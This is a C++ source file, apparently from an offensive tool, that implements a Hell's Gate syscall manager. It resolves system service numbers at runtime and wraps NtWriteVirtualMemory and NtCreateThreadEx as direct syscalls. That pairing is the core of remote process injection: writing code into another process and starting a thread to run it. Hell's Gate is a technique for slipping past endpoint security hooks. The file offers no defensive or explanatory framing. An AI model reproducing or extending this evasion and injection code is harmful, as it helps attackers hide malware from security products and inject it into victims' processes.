//
// Created by Stefy on 5/2/2026.
//

#include "HellsGate/SyscallManager.h"


std::vector<std::wstring> SyscallManager::functions = {L"NtWriteVirtualMemory", L"NtCreateThreadEx"};

NTSTATUS SyscallManager::SyscallNtWriteVirtualMemory(HANDLE hProc, PVOID base, PVOID buf, SIZE_T size, PSIZE_T written) {

    auto ssn = GetSSNOfFunction("NtWriteVirtualMemory");

    return GenericInternalSyscall(
            (PVOID)hProc, base, buf, (PVOID)size, (PVOID)written,
            NULL, NULL, NULL, NULL, NULL, NULL, // Padding for unused args
            ssn
    );
}

NTSTATUS SyscallManager::SyscallNtCreateThreadEx(PHANDLE hThread, ACCESS_MASK access, PVOID objAttr, HANDLE hProc, PVOID start, PVOID arg, ULONG flags, ULONG_PTR zero, SIZE_T stack, SIZE_T maxStack, PVOID attrList) {

    auto ssn = GetSSNOfFunction("NtCreateThreadEx");

    return GenericInternalSyscall(
            (PVOID)hThread, (PVOID)access, objAttr, hProc, start,
            arg, (PVOID)flags, (PVOID)zero, (PVOID)stack, (PVOID)maxStack, attrList,
            ssn
    );
}

SyscallManager& SyscallManager::getInstance() {
    static SyscallManager instance;
    return instance;
}

WORD SyscallManager::GetSSNOfFunction(const std::string& functionName) {
    auto itFunc = std::find(functions.begin(), functions.end(), std::wstring(functionName.begin(), functionName.end()));
    if (itFunc == functions.end()) {
        return 0;
    }

    auto itMap = syscallMap.find(functionName);
    if (itMap != syscallMap.end()) {
        return itMap->second;
    }

    // Retrieve SSN using HellsGate and cache it
    WORD ssn = HellsGate(functionName.c_str());
    if (ssn != 0) {
        syscallMap[functionName] = ssn; // Cache the SSN
    }

    return ssn;
}
